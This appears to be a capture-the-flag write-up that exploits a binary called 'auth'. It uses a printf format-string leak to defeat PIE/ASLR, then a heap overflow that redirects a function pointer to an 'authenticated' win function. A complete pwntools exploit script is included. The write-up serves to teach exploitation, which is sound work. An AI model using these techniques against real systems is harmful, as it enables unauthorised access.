![image](https://github.com/AndreQuimper/Writeups/assets/96965806/b6f07a0b-10ed-4633-8fd2-4ea35bbad1a3)

Running the binary shows a prompt for a username and a password  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/bbd23d06-706c-4039-8f85-6d6c76813541)  

If we analyze the binary with ghidra we can see the following main function  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/1a9a8976-9b56-4f9f-9ac3-591d559b8ebf)  
As you can see, there is a printf vulnerability on line 14, that will come in handy later.  
The other interesting functions are `auth` and `authenticated`  
![image](https://github.com/AndreQuimper/Writeups/assets/96965806/f6d7d963-22bb-474f-ac3f-c6fdcde717c6)  
Authenticated is the "Win" function (aka what we want to execute) and auth is a function that writes a pointer to the `normal` function on the heap, writes the "Password" also on the heap and then calls the `normal` function.  
We can see that there is an overflow vulnerability that allows us to overwrite anything on the heap.  

Our exploitation consists of the following:  
1. Leaking Memory:  
   Since ASLR and PIE are enabled we need to use the printf vulnerability to find the new base address of our binary.
   Using gdb and testing we find out that the 15th argument to printf is a pointer to main.

2. Overwriting `normal` with a pointer to `authenticated`:  
   Ghidra tells us that there is an offset of 0x68 bytes between our password and the pointer to `normal`.


This is what our final exploit looks like  
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template auth
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'auth')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()


# 15th %p is main
io.sendline(b"%15$p")
io.recvuntil(b'Hello ')
main_addr = io.recvuntil(b",", drop=True)
main_addr = int(main_addr,base=16)
log.info(f'Address of main: {hex(main_addr)}')

exe.address = main_addr - exe.symbols['main'] 
payload = 0x68*b'A' + p64(exe.symbols['authenticated'])
io.sendline(payload)
io.interactive()
```



